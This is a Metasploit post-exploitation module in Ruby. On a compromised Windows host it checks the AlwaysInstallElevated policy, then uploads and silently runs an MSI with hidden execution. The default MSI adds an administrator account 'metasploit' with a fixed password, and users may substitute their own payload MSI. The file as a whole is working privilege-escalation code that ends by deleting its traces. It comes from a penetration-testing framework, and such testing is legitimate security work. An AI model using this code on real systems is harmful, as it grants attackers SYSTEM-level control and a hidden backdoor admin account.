##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'msf/core/post/windows/registry'
require 'rex'

class Metasploit3 < Msf::Post

	include Msf::Post::Windows::Registry

	def initialize(info={})
		super( update_info( info,
			'Name'          => 'Windows AlwaysInstallElevated MSI',
			'Description'   => %q{
				This module checks the AlwaysInstallElevated registry keys which
				dictate if .MSI files should be installed with elevated privileges
				(NT AUTHORITY\SYSTEM).

				It then uploads and runs an MSI to which adds the user 'metasploit' as
				an administrator with the password 'P@55w0rd12345'.

				The user can specify their own MSI file (perhaps an MSF payload exe
				wrapped in an MSI file). The default MSI file is data/post/create_admin.msi 
				with the WiX source file under data/post/create_admin_source/.
			},
			'License'       => MSF_LICENSE,
			'Author'        =>
				[
					'Ben Campbell <eat_meatballs[at]hotmail.co.uk>', # Metasploit module
					'Parvez Anwar' # Discovery? Inspiration
				],
			'Version'       => '$Revision$',
			'Platform'      => [ 'win' ],
			'SessionTypes'  => [ 'meterpreter' ],
			'References'    =>
				[
					[ 'URL', 'http://www.greyhathacker.net/?p=185' ],
					[ 'URL', 'http://msdn.microsoft.com/en-us/library/aa367561(VS.85).aspx' ],
					[ 'URL', 'http://wix.sourceforge.net'] ,
				],
			'DisclosureDate'=> 'Mar 18 2010',
		))

		register_options([
			OptString.new('MSI_FILE', [false, 'A custom MSI file to execute on the host', nil]),
		], self.class)
	end

	def run
		install_elevated = "AlwaysInstallElevated"
		installer = "SOFTWARE\\Policies\\Microsoft\\Windows\\Installer"
		hkcu = "HKEY_CURRENT_USER\\#{installer}"
		hklm = "HKEY_LOCAL_MACHINE\\#{installer}"

		local_machine_value = registry_getvaldata(hklm,install_elevated)

		if local_machine_value.nil?
			print_error("#{hklm}\\#{install_elevated} does not exist or is not accessible, aborting...")
			return
		elsif local_machine_value == 0
			print_error("#{hklm}\\#{install_elevated} is #{local_machine_value}, aborting...")
			return
		else
			print_good("#{hklm}\\#{install_elevated} is #{local_machine_value}.")
		end

		current_user_value = registry_getvaldata(hkcu,install_elevated)

		if current_user_value.nil?
			print_error("#{hkcu}\\#{install_elevated} does not exist or is not accessible, aborting...")
			return
		elsif current_user_value == 0
			print_error("#{hkcu}\\#{install_elevated} is #{current_user_value}, aborting...")
			return
		else
			print_good("#{hkcu}\\#{install_elevated} is #{current_user_value}.")
			msi_filename = Rex::Text.rand_text_alpha((rand(8)+6)) + ".msi"

			# Check for Custom MSI
			if datastore['MSI_FILE'].nil?
				msi_source = ::File.join(Msf::Config.install_root, "data", "post", "create_admin.msi")
			else
				msi_source = datastore['MSI_FILE']
				print_status("Using custom MSI: #{msi_source}")
			end

			# Upload MSI
			msi_destination = "#{session.fs.file.expand_path("%TEMP%")}\\#{msi_filename}"
			print_status("Uploading the MSI to #{msi_destination} ...")
			session.fs.file.upload_file(msi_destination, msi_source)

			# Execute MSI
			print_status("Executing MSI...")
			cmd = "msiexec.exe /quiet /passive /n /package #{msi_destination}"
			session.sys.process.execute(cmd, nil, {'Hidden' => true})

			select(nil, nil, nil, 5)

			# Verify
			if datastore['MSI_FILE'].nil?
				print_status("Verifying user created...")
				begin
					print_line client.shell_command_token("net user metasploit", 5)
				rescue Exception => e
					print_error(e)
				end
			end

			# Cleanup
			print_status("Deleting MSI...")
			session.fs.file.delete(msi_destination)
		end
	end
end
